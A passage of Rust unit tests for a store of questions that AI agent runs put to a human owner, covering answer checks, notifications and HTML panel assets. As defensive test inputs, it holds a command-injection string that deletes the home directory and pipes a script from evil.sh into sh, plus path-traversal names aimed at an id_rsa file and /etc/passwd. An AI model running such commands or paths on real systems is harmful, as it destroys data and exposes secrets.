        let body = serde_json::to_string(&q).unwrap();
        assert_eq!(serde_json::from_str::<Question>(&body).unwrap(), q);
    }

    #[test]
    fn an_answer_the_question_never_offered_is_refused_with_its_own_reason() {
        // Four different mistakes, four different fixes: the web handler shows
        // these strings to the person who made them.
        let mut unoffered = choice_question();
        let a = unoffered
            .answer(Answer::Choice("Postgres".to_owned()))
            .unwrap_err()
            .to_string();

        let mut typed = choice_question();
        let b = typed
            .answer(Answer::Text("use Postgres".to_owned()))
            .unwrap_err()
            .to_string();

        let mut blank = free_question();
        let c = blank
            .answer(Answer::Text("   \n".to_owned()))
            .unwrap_err()
            .to_string();

        let mut twice = choice_question();
        twice.answer(Answer::Choice("SQLite".to_owned())).unwrap();
        let d = twice
            .answer(Answer::Choice("Redis".to_owned()))
            .unwrap_err()
            .to_string();

        assert!(a.contains("not one of the choices"), "{a}");
        assert!(b.contains("multiple choice"), "{b}");
        assert!(c.contains("empty"), "{c}");
        assert!(d.contains("already answered"), "{d}");
        let mut distinct = vec![a, b, c, d];
        let asked = distinct.len();
        distinct.sort_unstable();
        distinct.dedup();
        assert_eq!(distinct.len(), asked, "each rejection is distinguishable");

        // The refused ones are still open, so the owner can answer properly.
        assert_eq!(unoffered.status, QuestionStatus::Open);
        assert_eq!(typed.status, QuestionStatus::Open);
        assert_eq!(blank.status, QuestionStatus::Open);
        // And the first answer to the double-answered one survived.
        assert_eq!(twice.resolution().as_deref(), Some("SQLite"));

        // Free text refuses a fabricated choice for the mirror-image reason.
        let mut free = free_question();
        let e = free
            .answer(Answer::Choice("SQLite".to_owned()))
            .unwrap_err()
            .to_string();
        assert!(e.contains("free text"), "{e}");
    }

    #[test]
    fn open_questions_are_listed_before_answered_ones() {
        let (_dir, s) = store();
        // Ids carry a timestamp, so force a known order: the answered one is
        // the newest, and must still sort below the open ones.
        let mut old_open = choice_question();
        old_open.id = "20260101-000001-aaaa".to_owned();
        let mut new_open = choice_question();
        new_open.id = "20260101-000002-bbbb".to_owned();
        let mut answered = choice_question();
        answered.id = "20260101-000003-cccc".to_owned();
        answered.answer(Answer::Choice("Redis".to_owned())).unwrap();
        for q in [&mut old_open, &mut new_open, &mut answered] {
            s.put(q).unwrap();
        }

        let ids: Vec<String> = s.list().into_iter().map(|q| q.id).collect();
        assert_eq!(
            ids,
            [
                "20260101-000002-bbbb",
                "20260101-000001-aaaa",
                "20260101-000003-cccc"
            ],
            "what has stopped work comes first; history sorts underneath"
        );
        assert_eq!(s.count_open(), 2);
        assert_eq!(s.open_for("20260902-201256-9fb7").len(), 2);
        assert!(s.open_for("some-other-run").is_empty());
        // The short id is what the phone and the reports show.
        assert_eq!(s.resolve_id("bbbb").unwrap(), "20260101-000002-bbbb");
        assert!(s.get("20260101-000002-bbbb").is_ok());
        assert!(s.resolve_id("nope").is_err());
        assert!(
            s.revision() > 0,
            "the store's mtime drives the phone's polling"
        );
    }

    #[test]
    fn a_question_file_magi_cannot_read_does_not_take_the_listing_down() {
        let (_dir, s) = store();
        let mut good = choice_question();
        s.put(&mut good).unwrap();
        // Truncated by a killed writer, and written by a magi from the future.
        std::fs::write(s.path_of("20260101-000009-dead"), "{\"schema\": 1, \"id\"").unwrap();
        let future = serde_json::json!({
            "schema": 99, "id": "20260101-000010-beef", "run": "r", "node": "n",
            "seat": "s", "summary": "?", "detail": "", "choices": [],
            "status": "open", "asked_at": "2026-01-01T00:00:00Z",
            "answered_at": null, "answer": null,
        });
        std::fs::write(
            s.path_of("20260101-000010-beef"),
            serde_json::to_string(&future).unwrap(),
        )
        .unwrap();

        let listed = s.list();
        assert_eq!(listed.len(), 1, "one bad file must not hide the open one");
        assert_eq!(listed[0].id, good.id);
        // Asked for by name, the unreadable one explains itself instead.
        let e = s.get("20260101-000010-beef").unwrap_err().to_string();
        assert!(e.contains("schema"), "{e}");
    }

    #[tokio::test]
    async fn the_wait_returns_the_answer_another_process_wrote() {
        // The phone, `magi answer` and this run are three processes with no
        // channel between them: the file is the channel, so the wait has to see
        // a write it did not make. Sub-second timings keep this a real wait
        // without a real one's duration.
        let (dir, s) = store();
        let mut q = choice_question();
        let id = q.id.clone();
        let writer = Questions::at(dir.path().join("questions"));
        let handle = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(30)).await;
            let mut fresh = writer.get(&id).expect("the question was filed first");
            fresh.answer(Answer::Choice("SQLite".to_owned())).unwrap();
            writer.put(&mut fresh).unwrap();
        });

        let got = wait_for_owner(
            &mut q,
            &s,
            &quiet(),
            Duration::from_secs(5),
            Duration::from_millis(10),
        )
        .await
        .unwrap();

        handle.await.unwrap();
        assert_eq!(got.as_deref(), Some("SQLite"));
        assert_eq!(
            q.status,
            QuestionStatus::Answered,
            "the caller's copy is refreshed from the answering process's record"
        );
        assert!(q.answered_at.is_some());
    }

    #[tokio::test]
    async fn a_question_nobody_answers_is_abandoned_not_deleted() {
        let (_dir, s) = store();
        let mut q = choice_question();

        let got = wait_for_owner(
            &mut q,
            &s,
            &quiet(),
            Duration::from_millis(60),
            Duration::from_millis(10),
        )
        .await
        .unwrap();

        assert!(got.is_none(), "a slow human is not an error; the run parks");
        assert_eq!(q.status, QuestionStatus::Abandoned);
        let on_disk = s.get(&q.id).expect("the record of what was asked survives");
        assert_eq!(on_disk.status, QuestionStatus::Abandoned);
        assert!(
            on_disk.detail.contains("Abandoned:"),
            "why nobody answered belongs with the question: {}",
            on_disk.detail
        );
        assert!(on_disk.resolution().is_none());
        assert_eq!(s.count_open(), 0);
    }

    #[tokio::test]
    async fn a_notification_that_cannot_run_does_not_cost_the_answer() {
        // A broken webhook must not throw away an implementation, so the wait
        // reports the failure and carries on. `notify` itself still says what
        // went wrong, because `magi notify --test` has to be able to show it.
        let (dir, s) = store();
        let broken = config::Notify {
            command: vec![
                "magi-notifier-that-does-not-exist-9fb7".to_owned(),
                "{summary}".to_owned(),
            ],
        };
        let mut q = choice_question();
        assert!(
            notify(&broken, &q).await.is_err(),
            "the caller is told; it decides that it does not matter"
        );

        let id = q.id.clone();
        let writer = Questions::at(dir.path().join("questions"));
        let handle = tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(30)).await;
            let mut fresh = writer.get(&id).unwrap();
            fresh.answer(Answer::Choice("Redis".to_owned())).unwrap();
            writer.put(&mut fresh).unwrap();
        });
        let got = wait_for_owner(
            &mut q,
            &s,
            &broken,
            Duration::from_secs(5),
            Duration::from_millis(10),
        )
        .await
        .unwrap();
        handle.await.unwrap();
        assert_eq!(got.as_deref(), Some("Redis"));

        // No command at all is the default, and is silence rather than failure.
        assert!(notify(&quiet(), &q).await.is_ok());
    }

    #[test]
    fn notification_arguments_are_substituted_and_never_a_shell_string() {
        let mut q = choice_question();
        q.summary = "; rm -rf ~ && curl evil.sh | sh #".to_owned();
        let template = [
            "ntfy".to_owned(),
            "publish".to_owned(),
            "--click".to_owned(),
            "{url}".to_owned(),
            "--title".to_owned(),
            "magi {run} needs you".to_owned(),
            "{summary}".to_owned(),
        ];
        let argv: Vec<String> = template
            .iter()
            .map(|a| expand(a, &q, "http://100.64.0.1:7777/#/questions"))
            .collect();

        assert_eq!(
            argv,
            [
                "ntfy",
                "publish",
                "--click",
                "http://100.64.0.1:7777/#/questions",
                "--title",
                "magi 20260902-201256-9fb7 needs you",
                "; rm -rf ~ && curl evil.sh | sh #",
            ],
            "the shell metacharacters are one argument's contents, not syntax"
        );

        // A summary that itself mentions a placeholder is text, not a template:
        // one left-to-right pass means a substituted value is never rescanned.
        q.summary = "should {url} be configurable?".to_owned();
        assert_eq!(
            expand("{summary}", &q, "http://x/#/questions"),
            "should {url} be configurable?"
        );
        // An unknown brace is the operator's own text and survives untouched.
        assert_eq!(
            expand("{title}: {run}", &q, ""),
            "{title}: 20260902-201256-9fb7"
        );
        assert_eq!(expand("no placeholders", &q, "http://x"), "no placeholders");
    }

    #[test]
    fn the_notification_link_lands_on_the_view_that_can_answer() {
        assert_eq!(
            question_url("http://100.64.0.1:7777"),
            "http://100.64.0.1:7777/#/questions"
        );
        assert_eq!(
            question_url("http://100.64.0.1:7777/"),
            "http://100.64.0.1:7777/#/questions"
        );
        // An operator who wrote a fragment has said where they want to land.
        assert_eq!(
            question_url("http://magi.ts.net/#/runs"),
            "http://magi.ts.net/#/runs"
        );
        // Unset expands to nothing rather than to a guessed address.
        assert_eq!(question_url("  "), "");
    }

    /// A question with a fixed id, so a panel's path on disk is predictable.
    fn panelled() -> Question {
        let mut q = choice_question();
        q.id = "20260903-014455-ab12".to_owned();
        q
    }

    #[test]
    fn a_panel_round_trips_verbatim_with_its_assets_listed_sorted() {
        let (dir, s) = store();
        let work = dir.path().join("worktree");
        std::fs::create_dir_all(&work).unwrap();
        std::fs::write(work.join("diff.svg"), "<svg/>").unwrap();
        std::fs::write(work.join("table.png"), b"\x89PNG").unwrap();

        let mut q = panelled();
        let html = "<h1>Merge?</h1>\n<img src=\"asset/diff.svg\">\n";
        s.put_panel(
            &mut q,
            html,
            &[work.join("table.png"), work.join("diff.svg")],
        )
        .unwrap();
        s.put(&mut q).unwrap();

        assert!(q.panel);
        assert_eq!(
            q.assets,
            ["diff.svg", "table.png"],
            "sorted, not in the order the agent happened to pass them"
        );
        assert_eq!(
            s.panel_html(&q.id).as_deref(),
            Some(html),
            "the html is stored byte for byte; the agent authored the markup"
        );
        assert_eq!(
            s.panel_asset(&q.id, "diff.svg").unwrap().as_deref(),
            Some(&b"<svg/>"[..])
        );

        // The record on disk carries the same two fields the front end reads.
        let body = std::fs::read_to_string(s.path_of(&q.id)).unwrap();
        let json: serde_json::Value = serde_json::from_str(&body).unwrap();
        assert_eq!(json["panel"], true);
        assert_eq!(json["assets"], serde_json::json!(["diff.svg", "table.png"]));
        let back = s.get(&q.id).unwrap();
        assert!(back.panel);
        assert_eq!(back.assets, q.assets);

        // The assets were copied, so the panel still renders after `magi fold`
        // has deleted the candidate worktree the agent authored it in.
        std::fs::remove_dir_all(&work).unwrap();
        assert_eq!(
            s.panel_asset(&q.id, "table.png").unwrap().as_deref(),
            Some(&b"\x89PNG"[..]),
            "a referenced asset would be gone with the worktree"
        );
    }

    #[test]
    fn a_traversal_asset_name_is_refused_before_the_filesystem_is_touched() {
        let (dir, s) = store();
        let mut q = panelled();
        s.put_panel(&mut q, "<p>ok</p>", &[]).unwrap();
        s.put(&mut q).unwrap();

        // A file exactly one level up from the panel directory - which is
        // where `..` lands - holding content a read would make visible.
        let secret = "this must never reach the browser";
        std::fs::write(s.root().join("id_rsa"), secret).unwrap();
        assert_eq!(
            std::fs::read_to_string(s.panel_dir(&q.id).join("../id_rsa")).unwrap(),
            secret,
            "the traversal is real: the operating system resolves this path \
             happily, which is why the name has to be refused before the join"
        );

        let long = "x".repeat(200);
        for name in [
            "..",
            "../id_rsa",
            "..\\id_rsa",
            "sub/../id_rsa",
            "/",
            "\\",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "",
            ".hidden",
            ".",
            long.as_str(),
        ] {
            assert!(!valid_asset_name(name), "`{name}` must fail the pattern");
            let e = s.panel_asset(&q.id, name).unwrap_err().to_string();
            assert!(
                e.contains("not a panel file name"),
                "`{name}` must be refused as a name, not attempted: {e}"
            );
            assert!(!e.contains(secret), "`{name}` reached the filesystem: {e}");
        }
        // A name that is allowed still finds its file, so the refusals above
        // were the rule at work and not a store that reads nothing.
        assert!(s.panel_asset(&q.id, "index.html").unwrap().is_some());

        // The same rule on the write side, where the name comes from a source
        // file's base name, and a refusal leaves the stored panel untouched.
        let hidden = dir.path().join(".hidden");
        std::fs::write(&hidden, "x").unwrap();
        let e = s
            .put_panel(&mut q, "<p>replacement</p>", &[hidden])
            .unwrap_err()
            .to_string();
        assert!(e.contains(".hidden") && e.contains("A-Za-z0-9"), "{e}");
        assert_eq!(s.panel_html(&q.id).as_deref(), Some("<p>ok</p>"));
        assert!(q.assets.is_empty());
    }

    #[test]
    fn the_panel_size_cap_refuses_an_oversized_asset_set_and_writes_nothing() {
        let (dir, s) = store();
        let mut q = panelled();
        s.put(&mut q).unwrap();

        // Sized rather than filled: the cap reads the file's length, and a
        // test that actually produced eight mebibytes would only be slower.
        let big = dir.path().join("recording.png");
        std::fs::File::create(&big)
            .unwrap()
            .set_len(PANEL_MAX_BYTES)
            .unwrap();

        let html = "<p>see the recording</p>";
        let total = PANEL_MAX_BYTES + html.len() as u64;
        let e = s.put_panel(&mut q, html, &[big]).unwrap_err().to_string();
        assert!(
            e.contains(&PANEL_MAX_BYTES.to_string()),
            "the cap is named so the agent knows the limit: {e}"
        );
        assert!(
            e.contains(&total.to_string()),
            "the actual size is named so the agent knows by how much: {e}"
        );

        assert!(!q.panel);
        assert!(q.assets.is_empty());
        let left: Vec<String> = std::fs::read_dir(s.root())
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            left,
            [format!("{}.json", q.id)],
            "a refused panel leaves neither a directory nor scratch: {left:?}"
        );
    }

    #[test]
    fn two_assets_sharing_a_base_name_are_refused_rather_than_one_hiding_the_other() {
        let (dir, s) = store();
        let (before, after) = (dir.path().join("before"), dir.path().join("after"));
        std::fs::create_dir_all(&before).unwrap();
        std::fs::create_dir_all(&after).unwrap();
        std::fs::write(before.join("diff.png"), "before").unwrap();
        std::fs::write(after.join("diff.png"), "after").unwrap();

        let mut q = panelled();
        let e = s
            .put_panel(
                &mut q,
                "<p>x</p>",
                &[before.join("diff.png"), after.join("diff.png")],
            )
            .unwrap_err()
            .to_string();
        assert!(e.contains("diff.png"), "{e}");
        assert!(
            e.contains("before") && e.contains("after"),
            "both sources are named, because the fix is to rename one: {e}"
        );
        assert!(!q.panel);
        assert!(!s.panel_dir(&q.id).exists());
    }

    #[test]
    fn storing_a_panel_twice_replaces_it_rather_than_merging_two_attempts() {
        let (dir, s) = store();
        std::fs::write(dir.path().join("old.png"), "old").unwrap();
        std::fs::write(dir.path().join("new.png"), "new").unwrap();

        let mut q = panelled();
        s.put_panel(&mut q, "<p>first</p>", &[dir.path().join("old.png")])
            .unwrap();
        s.put_panel(&mut q, "<p>second</p>", &[dir.path().join("new.png")])
            .unwrap();

        assert_eq!(q.assets, ["new.png"]);
        assert_eq!(s.panel_html(&q.id).as_deref(), Some("<p>second</p>"));
        assert!(
            s.panel_asset(&q.id, "old.png").unwrap().is_none(),
            "an asset from the first attempt would show a mix of two answers"
        );

        s.drop_panel(&q.id).unwrap();
        assert!(s.panel_html(&q.id).is_none());
        assert!(!s.panel_dir(&q.id).exists());
        s.drop_panel(&q.id)
            .expect("dropping a panel that is already gone is the desired state");
    }

    #[test]
    fn a_question_with_no_panel_reports_none_rather_than_an_error() {
        let (_dir, s) = store();
        let mut q = panelled();
        s.put(&mut q).unwrap();

        assert!(!q.panel);
        assert!(s.panel_html(&q.id).is_none());
        assert!(
            s.panel_asset(&q.id, "diff.svg").unwrap().is_none(),
            "a missing file is a 404 for the caller, not a failure of the store"
        );
        let json = serde_json::to_value(&q).unwrap();
        assert_eq!(json["panel"], false);
        assert_eq!(json["assets"], serde_json::json!([]));

        // And an empty panel is refused, because an empty frame reads to the
        // owner as "the agent had nothing to say".
        let e = s.put_panel(&mut q, "  \n", &[]).unwrap_err().to_string();
        assert!(e.contains("empty panel"), "{e}");
        assert!(!s.panel_dir(&q.id).exists());
    }

    #[test]
    fn a_question_written_before_panels_existed_still_deserialises() {
        let (_dir, s) = store();
        std::fs::create_dir_all(s.root()).unwrap();
        let id = "20260902-231501-ab12";
        // Byte for byte what an older magi wrote: no `panel`, no `assets`.
        let body = r#"{
  "schema": 1,
  "id": "20260902-231501-ab12",
  "run": "20260902-201256-9fb7",
  "node": "implement",
  "seat": "impl-A",
  "summary": "Which storage backend should the cache use?",
  "detail": "Both are already dependencies.",
  "choices": ["SQLite", "Redis"],
  "status": "open",
  "asked_at": "2026-09-02T23:15:01Z",
  "answered_at": null,
  "answer": null
}"#;
        std::fs::write(s.path_of(id), body).unwrap();

        let q = s.get(id).unwrap();
        assert!(
            !q.panel,
            "an absent field means no panel, not a parse error"
        );
        assert!(q.assets.is_empty());
        assert_eq!(q.summary, "Which storage backend should the cache use?");
        assert_eq!(
            s.list().len(),
            1,
            "and it is still listed; skipping it would hide an open question"
        );
    }
}
